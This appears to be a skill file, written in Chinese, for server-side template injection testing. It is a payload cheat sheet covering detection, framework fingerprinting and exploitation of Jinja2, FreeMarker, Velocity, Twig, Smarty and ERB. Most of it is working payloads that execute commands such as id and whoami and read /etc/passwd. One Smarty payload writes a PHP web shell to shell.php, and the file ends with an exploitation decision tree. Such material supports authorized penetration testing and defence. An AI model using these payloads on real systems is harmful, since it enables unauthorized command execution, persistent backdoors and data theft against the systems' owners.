---
name: ssti-testing
description: SSTI服务端模板注入测试，覆盖检测→Jinja2→FreeMarker→Velocity→Smarty→Twig→ERB利用→沙箱逃逸全流程
---

# SSTI模板注入测试

## 1. 检测方法

### 1.1 常见注入点

```
URL参数: ?name={{7*7}} → 返回49 = SSTI
模板变量: ?template=<%= 7*7 %>
用户输入渲染到模板的任何位置
```

### 1.2 检测Payload

```python
# 通用检测
{{7*7}}           # 返回49 → 确认SSTI
${7*7}            # FreeMarker风格
<%= 7*7 %>        # ERB/ERuby
#{7*7}            # Pug/Jade

# 框架指纹
{{config}}        # Flask/Jinja2
{{self}}          # Jinja2
{{_self}}         # Twig
${.version}       # FreeMarker
#set($x=7*7)$x    # Velocity
<%= 7*7 %>        # ERB
```

## 2. Jinja2 (Python/Flask)

```python
# 基础信息收集
{{config}}                              # Flask配置
{{config.items()}}                      # 所有配置项
{{self.__init__.__globals__}}           # 全局变量

# 命令执行 (Python3)
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__.os.popen('id').read()}}
{{get_flashed_messages.__globals__.os.popen('id').read()}}

# 无{{ 绕过
{% if ''.__class__.__mro__[1].__subclasses__() %}...{% endif %}
{%print(lipsum.__globals__['os'].popen('id').read())%}
```

### Jinja2沙箱逃逸

```python
# 找到subprocess.Popen
''.__class__.__mro__[1].__subclasses__()
# 或遍历找 os._wrap_close / subprocess.Popen / builtins.exec
```

## 3. FreeMarker (Java)

```freemarker
# 命令执行
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}

# 文件读取
${product("")?api.getResource("").getClass().getResource("/etc/passwd")}
```

## 4. Velocity (Java)

```velocity
# 命令执行
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
$rt.getRuntime().exec('whoami')
```

## 5. Twig (PHP)

```twig
# 信息收集
{{_self}}
{{_self.env}}

# 代码执行 (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback('system')}}
{{_self.env.getFilter('id')}}

# Twig 2.x/3.x
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|filter('system')}}
```

## 6. Smarty (PHP)

```smarty
# Smarty 3
{system('id')}
{Smarty_Internal_Write_File::writeFile(['shell.php'],['<?php @eval($_POST[1]);?>'])}

# 静态方法调用 (如果启用)
{Smarty::$_config|var_dump}
```

## 7. ERB (Ruby)

```ruby
# 命令执行
<%= system('whoami') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>

# 文件读取
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>

# 类遍历
<%= Module.constants %>
```

## 8. 决策树

```
发现模板渲染 → 发送{{7*7}}
├─ 返回49 → SSTI确认 → 发送框架指纹Payload
│   ├─ {{config}} / {{self}} → Jinja2 (Python)
│   │   └─ lipsum.__globals__.os.popen('id').read()
│   ├─ ${7*7} / ${.version} → FreeMarker (Java)
│   │   └─ Execute?new
│   ├─ #set / $x → Velocity (Java)
│   ├─ {{_self}} → Twig (PHP)
│   │   └─ filter('system')
│   ├─ {system()} → Smarty (PHP)
│   └─ <%= 7*7 %> → ERB (Ruby)
│       └─ system('whoami')
└─ 无返回 → 尝试其他Payload → 编码绕过
```

---

*参考: PayloadAllTheThings SSTI + PortSwigger SSTI + HackTricks*
